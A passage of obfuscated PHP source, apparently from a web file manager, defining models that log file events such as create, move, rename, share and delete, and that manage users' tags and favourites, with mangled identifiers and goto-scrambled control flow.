$Bãœ±·ª’ñ[] = intval($f­ÎåŞİ¶¯[$e†×ÛÊ°¯Œ[484]]); } else { if ($f­ÎåŞİ¶¯[$e†×ÛÊ°¯Œ[404]] == SourceModel::TYPE_GROUP) { $EÆ‡‰ˆ•÷™[] = intval($f­ÎåŞİ¶¯[$e†×ÛÊ°¯Œ[484]]); } } } if ($Bãœ±·ª’ñ) { $Bãœ±·ª’ñ = Model($e†×ÛÊ°¯Œ[502])->userListInfo($Bãœ±·ª’ñ); } if ($EÆ‡‰ˆ•÷™) { $DïôƒãÍä¨ = array($e†×ÛÊ°¯Œ[1759] => array($e†×ÛÊ°¯Œ[411], $EÆ‡‰ˆ•÷™)); $EÆ‡‰ˆ•÷™ = Model($e†×ÛÊ°¯Œ[486])->field($e†×ÛÊ°¯Œ[1884])->where($DïôƒãÍä¨)->select(); $EÆ‡‰ˆ•÷™ = array_to_keyvalue($EÆ‡‰ˆ•÷™, $e†×ÛÊ°¯Œ[1681]); } goto a÷‘Äïî; bÊîÛì†Ì: $e†×ÛÊ°¯Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bãœ±·ª’ñ = array(); $EÆ‡‰ˆ•÷™ = array(); goto F¾ô˜­¥‡’; a÷‘Äïî: return array($e†×ÛÊ°¯Œ[1885] => $Bãœ±·ª’ñ, $e†×ÛÊ°¯Œ[1886] => $EÆ‡‰ˆ•÷™); goto CÄ„¸ô¿ˆ; CÄ„¸ô¿ˆ: } public function authInfo($EÙ‘‚Õ‹½®) { $F¢†óÈñï =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($EÙ‘‚Õ‹½®[$F¢†óÈñï[1776]]) { $BÅÎŒÂÃÄ‹ = Model($F¢†óÈñï[1848])->listData($EÙ‘‚Õ‹½®[$F¢†óÈñï[1776]]); if (!$BÅÎŒÂÃÄ‹) { return !1; $BÇ×©ƒ˜¸ = Model($F¢†óÈñï[1848])->listData(); $F’­„¬ÁôÔ = array_filter_by_field($BÇ×©ƒ˜¸, $F¢†óÈñï[406], $F¢†óÈñï[191]); return $F’­„¬ÁôÔ; } $Cçó¥Ûè™Ñ = array_field_key($BÅÎŒÂÃÄ‹, array($F¢†óÈñï[393], $F¢†óÈñï[28], $F¢†óÈñï[406], $F¢†óÈñï[1702], $F¢†óÈñï[1704])); $Cçó¥Ûè™Ñ[$F¢†óÈñï[1887]] = $EÙ‘‚Õ‹½®; return $Cçó¥Ûè™Ñ; } else { return array($F¢†óÈñï[412] => 0, $F¢†óÈñï[1687] => $EÙ‘‚Õ‹½®[$F¢†óÈñï[1830]], $F¢†óÈñï[413] => $F¢†óÈñï[33], $F¢†óÈñï[1702] => $F¢†óÈñï[1888]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\x72\143\x65\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\x65\141\164\145\x54\151\x6d\x65", "\164\151\x6d\145", "\x69\156\x73\x65\x72\164", "\x66\x75\156\x63\x74\151\157\x6e"), array("\144\145\x73\143", '', "\x69\156\163\145\x72\164\x2c\165\160\144\x61\164\145\54\163\145\x6c\145\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($e½¨³ÉÚ”¬, $C¹ƒÖÂ ø, $c¡°–ƒ† = '') { goto ağºá¨§–; ağºá¨§–: $c¢×åÜ²’À =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->eventSave) { return; } $F¥×œ—™…ë = Model($c¢×åÜ²’À[1197])->sourceInfo($e½¨³ÉÚ”¬); goto b…ëÑğ¨¬¸; cŞ‰¥‚åãº: return $this->add($bÒÇ¥ŠĞ·…); goto fäøôêÄÒ¥; b…ëÑğ¨¬¸: if (!$F¥×œ—™…ë) { return !1; } if ($this->isCacheEvent($F¥×œ—™…ë, $C¹ƒÖÂ ø)) { return; } if ($c¡°–ƒ† && is_string($c¡°–ƒ†)) { $c¡°–ƒ† = array($c¢×åÜ²’À[1714] => $c¡°–ƒ†); } goto f¤¸˜—ó„ˆ; f¤¸˜—ó„ˆ: $bÒÇ¥ŠĞ·… = array($c¢×åÜ²’À[410] => $e½¨³ÉÚ”¬, $c¢×åÜ²’À[1889] => $F¥×œ—™…ë[$c¢×åÜ²’À[478]], $c¢×åÜ²’À[1890] => $F¥×œ—™…ë[$c¢×åÜ²’À[28]], $c¢×åÜ²’À[495] => !empty($F¥×œ—™…ë[$c¢×åÜ²’À[495]]) ? $F¥×œ—™…ë[$c¢×åÜ²’À[495]] : $c¢×åÜ²’À[33], $c¢×åÜ²’À[1509] => USER_ID, $c¢×åÜ²’À[415] => $C¹ƒÖÂ ø, $c¢×åÜ²’À[1511] => $c¡°–ƒ†); $this->addSystemLog($C¹ƒÖÂ ø, $bÒÇ¥ŠĞ·…); unset($bÒÇ¥ŠĞ·…[$c¢×åÜ²’À[1890]], $bÒÇ¥ŠĞ·…[$c¢×åÜ²’À[495]]); goto cŞ‰¥‚åãº; fäøôêÄÒ¥: } private function addSystemLog($E­”Ğ©–¼‡, $b…×òÊé¤¼) { $d–÷²’–ù =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($E­”Ğ©–¼‡ == $d–÷²’–ù[1891]) { $E­”Ğ©–¼‡ = $b…×òÊé¤¼[$d–÷²’–ù[431]][$d–÷²’–ù[1892]]; } else { if (in_array($E­”Ğ©–¼‡, array($d–÷²’–ù[1658], $d–÷²’–ù[1893]))) { $E­”Ğ©–¼‡ = $b…×òÊé¤¼[$d–÷²’–ù[431]][$d–÷²’–ù[707]]; } } $AÇ¸«Ñğ„ = array_merge($b…×òÊé¤¼, array($d–÷²’–ù[1894] => $b…×òÊé¤¼[$d–÷²’–ù[395]], $d–÷²’–ù[1895] => $b…×òÊé¤¼[$d–÷²’–ù[1895]])); Model($d–÷²’–ù[1622])->addLog($d–÷²’–ù[1896] . $E­”Ğ©–¼‡, $AÇ¸«Ñğ„); } private function isCacheEvent($cß‘‡ë²ã©, $E¾–İßæ×Í) { if ($cß‘‡ë²ã©[$_SERVER[ÒÆ›ÆØÎ¾][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F“âÎššÙ², $E‘Šô†õ‡ì) { $aÅØîğÀÃ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d®ÑƒÇˆ„ = Model($aÅØîğÀÃ[1197])->sourceInfo($F“âÎššÙ²); $cŒ¢Ç­†¶’ = array($aÅØîğÀÃ[1892] => $E‘Šô†õ‡ì, $aÅØîğÀÃ[28] => $d®ÑƒÇˆ„[$aÅØîğÀÃ[28]]); return $this->addEvent($F“âÎššÙ², $aÅØîğÀÃ[1891], $cŒ¢Ç­†¶’); } public function eventFileEdit($c¡Œ¸‹Û£) { $eÒ›¥Éí’‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÎ¨™Ø¤×„ = array($eÒ›¥Éí’‰[1897] => $_SERVER[$eÒ›¥Éí’‰[1898]], $eÒ›¥Éí’‰[1899] => strtolower(ACTION)); return $this->addEvent($c¡Œ¸‹Û£, $eÒ›¥Éí’‰[1648], $FÎ¨™Ø¤×„); } public function eventRecycle($dâš‰ŒõËÃ, $a†£Ë¬Ù»Î) { return $this->addEvent($dâš‰ŒõËÃ, $_SERVER[ÒÆ›ÆØÎ¾][1893], $a†£Ë¬Ù»Î); } public function eventRemove($fÒÉ‰ˆ«ø) { $bîÂĞ›½¡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DóêˆËö¸É = Model($bîÂĞ›½¡[1197])->sourceInfo($fÒÉ‰ˆ«ø); $dğ—ƒôù¢ = $DóêˆËö¸É[$bîÂĞ›½¡[28]]; return $this->addEvent($DóêˆËö¸É[$bîÂĞ›½¡[478]], $bîÂĞ›½¡[1647], $dğ—ƒôù¢); } public function eventShare($EÌÖê´Ëäê, $E™ÓÉ™Üùì) { return $this->addEvent($EÌÖê´Ëäê, $_SERVER[ÒÆ›ÆØÎ¾][1658], $E™ÓÉ™Üùì); } public function eventMove($fÛŸ¾Å©†‹, $F•ËÜ‹äéÙ, $AòÈ‚Õé¹ë) { goto a¸ƒĞİ«ñ«; FŞ©ƒ³ÊÔ: $this->addEvent($F•ËÜ‹äéÙ, $cÍ‚•³²ğ[1903], $Cê‰Ì¢­¡ß); goto cµ×»ó…º; dİÆ‰ºàñÜ: $cÂŒ˜´™¸ä = $aº·ñ£ŠöŠ->sourceInfo($F•ËÜ‹äéÙ); $a—½µªƒ‹· = $aº·ñ£ŠöŠ->sourceInfo($AòÈ‚Õé¹ë); $Cê‰Ì¢­¡ß = array($cÍ‚•³²ğ[1046] => $F•ËÜ‹äéÙ, $cÍ‚•³²ğ[1900] => $cÂŒ˜´™¸ä[$cÍ‚•³²ğ[28]], $cÍ‚•³²ğ[1880] => !empty($cÂŒ˜´™¸ä[$cÍ‚•³²ğ[495]]) ? $cÂŒ˜´™¸ä[$cÍ‚•³²ğ[495]] : $cÍ‚•³²ğ[33], $cÍ‚•³²ğ[1047] => $AòÈ‚Õé¹ë, $cÍ‚•³²ğ[1901] => $a—½µªƒ‹·[$cÍ‚•³²ğ[28]], $cÍ‚•³²ğ[1902] => !empty($a—½µªƒ‹·[$cÍ‚•³²ğ[495]]) ? $a—½µªƒ‹·[$cÍ‚•³²ğ[495]] : $cÍ‚•³²ğ[33]); goto d‚Ì³‹•ø‹; a¸ƒĞİ«ñ«: $cÍ‚•³²ğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aº·ñ£ŠöŠ = Model($cÍ‚•³²ğ[1197]); $c‡µù‰Å = $aº·ñ£ŠöŠ->sourceInfo($fÛŸ¾Å©†‹); goto dİÆ‰ºàñÜ; d‚Ì³‹•ø‹: $this->addEvent($fÛŸ¾Å©†‹, $cÍ‚•³²ğ[520], $Cê‰Ì¢­¡ß); $c‡µù‰Å = $aº·ñ£ŠöŠ->sourceInfo($fÛŸ¾Å©†‹); $Cê‰Ì¢­¡ß = array($cÍ‚•³²ğ[395] => $c‡µù‰Å[$cÍ‚•³²ğ[395]], $cÍ‚•³²ğ[28] => $c‡µù‰Å[$cÍ‚•³²ğ[28]]); goto FŞ©ƒ³ÊÔ; cµ×»ó…º: } public function eventCopy($cãœ§Õã§‹) { $this->eventCreate($cãœ§Õã§‹, $_SERVER[ÒÆ›ÆØÎ¾][518]); } public function eventRename($dÙ’á‡·Ö‡, $aóÃàÓ¥Ş£, $F„Ñ“â“«í) { $D–÷ˆåÈÃÜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cª£™µ’¥ = array($D–÷ˆåÈÃÜ[1046] => $aóÃàÓ¥Ş£, $D–÷ˆåÈÃÜ[1047] => $F„Ñ“â“«í); return $this->addEvent($dÙ’á‡·Ö‡, $D–÷ˆåÈÃÜ[1211], $Cª£™µ’¥); } public function eventAddComment($a—‚òÛˆ›§, $fƒ‡éß®ø) { return $this->addEvent($a—‚òÛˆ›§, $_SERVER[ÒÆ›ÆØÎ¾][1904], $fƒ‡éß®ø); } public function eventAddDesc($B¤õÂÓ¹‡Ñ, $d²†ÏÙ²¾ƒ) { return $this->addEvent($B¤õÂÓ¹‡Ñ, $_SERVER[ÒÆ›ÆØÎ¾][1905], $d²†ÏÙ²¾ƒ); } public function listBySource($Eİ«­–è®™) { goto B‡³ŠÌåá; B‡³ŠÌåá: $e‚Šˆ«¬£„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eíËçÒéìª = Model($e‚Šˆ«¬£„[1197])->sourceInfo($Eİ«­–è®™); $Aíç¦šÁóÚ = array($e‚Šˆ«¬£„[410] => $Eİ«­–è®™); goto DÃ²è¯÷Òğ; CáìÚÆîâ: return $this->eventListParse($b‰§Å‘„‡, $Eİ«­–è®™); goto bõöºšºÌ; DÃ²è¯÷Òğ: if ($eíËçÒéìª[$e‚Šˆ«¬£„[403]] == $e‚Šˆ«¬£„[87]) { $FÔƒ‰’”öª = Model($e‚Šˆ«¬£„[1197])->listSearchChildren($Eİ«­–è®™, 20000); $FÔƒ‰’”öª[] = $Eİ«­–è®™ . $e‚Šˆ«¬£„[375]; $Aíç¦šÁóÚ = array($e‚Šˆ«¬£„[395] => array($e‚Šˆ«¬£„[7], $FÔƒ‰’”öª)); } $b‰§Å‘„‡ = $this->where($Aíç¦šÁóÚ)->order($e‚Šˆ«¬£„[1906])->selectPage(); if ($b‰§Å‘„‡[$e‚Šˆ«¬£„[364]][$e‚Šˆ«¬£„[365]] == 0) { $b‰§Å‘„‡[$e‚Šˆ«¬£„[364]][$e‚Šˆ«¬£„[365]] = 1; $b‰§Å‘„‡[$e‚Šˆ«¬£„[367]] = array(array($e‚Šˆ«¬£„[410] => $Eİ«­–è®™, $e‚Šˆ«¬£„[1889] => $eíËçÒéìª[$e‚Šˆ«¬£„[478]], $e‚Šˆ«¬£„[1509] => $eíËçÒéìª[$e‚Šˆ«¬£„[432]], $e‚Šˆ«¬£„[415] => $e‚Šˆ«¬£„[1907], $e‚Šˆ«¬£„[416] => $eíËçÒéìª[$e‚Šˆ«¬£„[194]], $e‚Šˆ«¬£„[1511] => $e‚Šˆ«¬£„[33])); } goto CáìÚÆîâ; bõöºšºÌ: } private function eventListParse($E ¤­åë‚Â, $Cí±ò­¨×â) { goto C‡Ç´¼Ÿà; eëåß§æŠğ: $eùÅÓ¦ÉÈ¥ = Model($C ·­·ßõ[782])->sourceListInfo($A…÷‚ä äà, !0); foreach ($Cêí÷Â÷îØ as &$EËåÅÁ©Ö³) { if ($EËåÅÁ©Ö³[$C ·­·ßõ[29]] == $C ·­·ßõ[520] && isset($EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[1046]])) { $EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[1046]] = $eùÅÓ¦ÉÈ¥[$EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[1046]]]; $EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[1047]] = $eùÅÓ¦ÉÈ¥[$EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[1047]]]; } if ($EËåÅÁ©Ö³[$C ·­·ßõ[29]] == $C ·­·ßõ[1903] && isset($EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[395]])) { $EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[395]] = $eùÅÓ¦ÉÈ¥[$EËåÅÁ©Ö³[$C ·­·ßõ[431]][$C ·­·ßõ[395]]]; } $EËåÅÁ©Ö³[$C ·­·ßõ[85]] = $eùÅÓ¦ÉÈ¥[$EËåÅÁ©Ö³[$C ·­·ßõ[395]]]; $EËåÅÁ©Ö³[$C ·­·ßõ[1908]] = $eùÅÓ¦ÉÈ¥[$EËåÅÁ©Ö³[$C ·­·ßõ[1895]]]; if ($EËåÅÁ©Ö³[$C ·­·ßõ[29]] == $C ·­·ßõ[1647]) { $EËåÅÁ©Ö³[$C ·­·ßõ[1908]] = $EËåÅÁ©Ö³[$C ·­·ßõ[85]]; $EËåÅÁ©Ö³[$C ·­·ßõ[1895]] = $EËåÅÁ©Ö³[$C ·­·ßõ[1908]][$C ·­·ßõ[395]]; $EËåÅÁ©Ö³[$C ·­·ßõ[85]] = !1; $EËåÅÁ©Ö³[$C ·­·ßõ[395]] = $C ·­·ßõ[33]; } $EËåÅÁ©Ö³[$C ·­·ßõ[1838]] = $B­æª•œõ[$EËåÅÁ©Ö³[$C ·­·ßõ[1517]]]; } unset($EËåÅÁ©Ö³); goto B¯Ü¢±ŒÆ±; C‡Ç´¼Ÿà: $C ·­·ßõ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cêí÷Â÷îØ = $E ¤­åë‚Â[$C ·­·ßõ[367]]; $A…÷‚ä äà = array_to_keyvalue($Cêí÷Â÷îØ, $C ·­·ßõ[33], $C ·­·ßõ[395]); goto eŒÍ½Şè†ª; AÓ³õóæØ: $A…÷‚ä äà = array_unique($A…÷‚ä äà); $d½Ìš  = array_unique(array_to_keyvalue($Cêí÷Â÷îØ, $C ·­·ßõ[33], $C ·­·ßõ[1517])); $B­æª•œõ = Model($C ·­·ßõ[506])->userListInfo($d½Ìš ); goto eëåß§æŠğ; B¯Ü¢±ŒÆ±: $E ¤­åë‚Â[$C ·­·ßõ[367]] = $Cêí÷Â÷îØ; return $E ¤­åë‚Â; goto F™òï°Æ¹â; eŒÍ½Şè†ª: $Fº‡·„‚Şç = array_to_keyvalue($Cêí÷Â÷îØ, $C ·­·ßõ[33], $C ·­·ßõ[1895]); foreach ($Cêí÷Â÷îØ as $EËåÅÁ©Ö³) { $AßçĞ¹™‹Æ = $EËåÅÁ©Ö³[$C ·­·ßõ[431]]; if ($EËåÅÁ©Ö³[$C ·­·ßõ[29]] == $C ·­·ßõ[520] && isset($AßçĞ¹™‹Æ[$C ·­·ßõ[1046]])) { $A…÷‚ä äà[] = $AßçĞ¹™‹Æ[$C ·­·ßõ[1046]] . $C ·­·ßõ[33]; $A…÷‚ä äà[] = $AßçĞ¹™‹Æ[$C ·­·ßõ[1047]] . $C ·­·ßõ[33]; } if ($EËåÅÁ©Ö³[$C ·­·ßõ[29]] == $C ·­·ßõ[1903] && isset($AßçĞ¹™‹Æ[$C ·­·ßõ[395]])) { $A…÷‚ä äà[] = $AßçĞ¹™‹Æ[$C ·­·ßõ[395]] . $C ·­·ßõ[33]; } } $A…÷‚ä äà = array_merge($A…÷‚ä äà, $Fº‡·„‚Şç, array($Cí±ò­¨×â . $C ·­·ßõ[33])); goto AÓ³õóæØ; F™òï°Æ¹â: } public function removeBySource($AŞÃ¨»¾œ³) { $E›«‚ïâ· = array($_SERVER[ÒÆ›ÆØÎ¾][410] => $AŞÃ¨»¾œ³); $this->where($E›«‚ïâ·)->remove(); } } goto D²©í‰ñßš; aÛ‚ËÜ·ÏÇ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($EºŞ»Îø) { $D§÷¢Ë©Ê× =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($D§÷¢Ë©Ê×[1783] => array(USER_ID, $D§÷¢Ë©Ê×[1784])); } protected function listData() { $föƒíô×Ú =& $_SERVER[ÒÆ›ÆØÎ¾]; $A—è¨Á†£ = array($föƒíô×Ú[1509] => USER_ID, $föƒíô×Ú[463] => array($föƒíô×Ú[1787], 0)); $D¿»”«èé = $föƒíô×Ú[1789]; $fÎ¶›å˜‰ï = $this->field($D¿»”«èé)->where($A—è¨Á†£)->order($föƒíô×Ú[1790])->select(); return $fÎ¶›å˜‰ï ? $fÎ¶›å˜‰ï : array(); } protected function listByTag($CèÈÅ¤Ôºí) { } protected function addToTag($F×½³µ¼İ¥, $f„Ü©«î°„) { $Cæ§ˆ§Û¬† =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!Model($Cæ§ˆ§Û¬†[1925])->listData($f„Ü©«î°„) || !Model($Cæ§ˆ§Û¬†[782])->pathInfo($F×½³µ¼İ¥)) { return !1; } $D§äµÔˆØ = array($Cæ§ˆ§Û¬†[1509] => USER_ID, $Cæ§ˆ§Û¬†[463] => $f„Ü©«î°„, $Cæ§ˆ§Û¬†[414] => $F×½³µ¼İ¥, $Cæ§ˆ§Û¬†[415] => $Cæ§ˆ§Û¬†[409], $Cæ§ˆ§Û¬†[413] => $Cæ§ˆ§Û¬†[33], $Cæ§ˆ§Û¬†[1685] => 0); if ($this->where($D§äµÔˆØ)->find()) { return !1; } return $this->add($D§äµÔˆØ); } protected function removeFromTag($EØ¿µ„ª½Å, $dãõ”Ô”  ) { $c×ò¸ãíµà =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!Model($c×ò¸ãíµà[1925])->listData($dãõ”Ô”  )) { return !1; } if (is_array($EØ¿µ„ª½Å)) { $EØ¿µ„ª½Å = array($c×ò¸ãíµà[7], $EØ¿µ„ª½Å); } $dê˜Ç‹•‹ = array($c×ò¸ãíµà[1509] => USER_ID, $c×ò¸ãíµà[463] => $dãõ”Ô”  , $c×ò¸ãíµà[415] => $c×ò¸ãíµà[409], $c×ò¸ãíµà[414] => $EØ¿µ„ª½Å); return $this->where($dê˜Ç‹•‹)->delete(); } protected function removeByTag($aëÉ¾åä¹É) { $eêäîÉ¾°² =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$aëÉ¾åä¹É) { return !1; } $Aº‘çÈÅô† = array($eêäîÉ¾°²[1509] => USER_ID, $eêäîÉ¾°²[463] => $aëÉ¾åä¹É); return $this->where($Aº‘çÈÅô†)->delete(); } protected function removeBySource($bÏéÀõµï™) { $c‘ÕÅÙÌåİ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_array($bÏéÀõµï™)) { $bÏéÀõµï™ = array($c‘ÕÅÙÌåİ[7], $bÏéÀõµï™); } $bšâùôé¶ = array($c‘ÕÅÙÌåİ[1509] => USER_ID, $c‘ÕÅÙÌåİ[414] => $bÏéÀõµï™, $c‘ÕÅÙÌåİ[463] => array($c‘ÕÅÙÌåİ[962], 0)); return $this->where($bšâùôé¶)->delete(); } }